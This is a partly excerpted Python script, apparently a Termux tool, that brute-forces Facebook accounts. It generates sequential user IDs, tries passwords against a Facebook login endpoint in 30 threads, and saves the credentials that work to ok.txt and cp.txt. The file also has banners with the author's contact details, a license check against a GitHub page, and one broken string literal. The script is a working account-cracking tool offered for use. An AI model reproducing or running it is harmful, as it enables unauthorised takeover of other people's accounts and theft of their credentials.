...
def logo():
  ...
  ═══════════════════════════════════════════════════════💥
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr Yasir Mekkan\x1b[0m\x1b[1;97m]
...
════════════════════════════════════════════════════════💥
\t\033[1;97m[\x1b[1;97m\x1b[1;41m PLAY BOY / {FUCK YOUR MIND}\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :6\x1b[0m\x1b[1;97m] \033[1;37m 
════════════════════════════════════════════════════════💥
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : PLAY BOY \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m WhatsApp   : +8801979526394 \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : PLAY BOY (100072883587040) \x1b[0m\x1b[1;97m]
════════════════════════════════════════════════════════💥
 """)
...
def helpnote():
	...
	#yahan apni YouTube id link dalna
	exit(" [=>] FACEBOOK :  https://www.facebook.com/profile.php?id=100072883587040")
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/playboy167/dark-net).text
			if basesplit in plr:
				key = basesplit
...
╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝                                                
═══════════════════════════════════💥
\t\033[1;97m[\x1b[1;97m\x1b[1;41m PLAY BOY\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 6\x1b[0m\x1b[1;97m] \033[1;37m 
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : PLAY BOY\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m WhatsApp   : +8801979526394\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : PLAY BOY (100072883587040) \x1b[0m\x1b[1;97m]
═══════════════════════════════════💥
    """)
		...
		subprocess.check_output(["am", "start", "https://youtube.com/channel/UCMwVbl52U3fGjWNstqbymAA"])
		print("───────────────────────────────────────────────────────× ")
...
#yahan nichy kch cherna ni just name chnge krna
	def fbtua(self):
		...
		xx = 99999999
		idx = "1000000" 
		limit = int(input("    \033[0;97m[=>]\033[0;97m TYPE 10000 (LUST LIMIT 50000): "))
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\033[0;92m[=×>]\033[0;92m NOTE : THIS IS A PAID TOOL 🔥")
				print("\033[0;92m[=×>]\033[0;92m NOTE : APROPLAIN MOOD ON/OF")
				print("\033[0;97m───────────────────────────────────────────────────────× ")
				for user in self.id:
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=PLAY=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=PLAY=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=PLAY=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=PLAY=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print("")
		print("\n [*] Author    : PLAY BOY  ")
		print(" [*] Team      :  TERMUX HELP CENTER")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : PLAY BOY (100072883587040) ")
		print(" [*] WhatsApp : +8801979526394 ")
		print(" [*] YouTube   : OFFLINE__BOY✓")
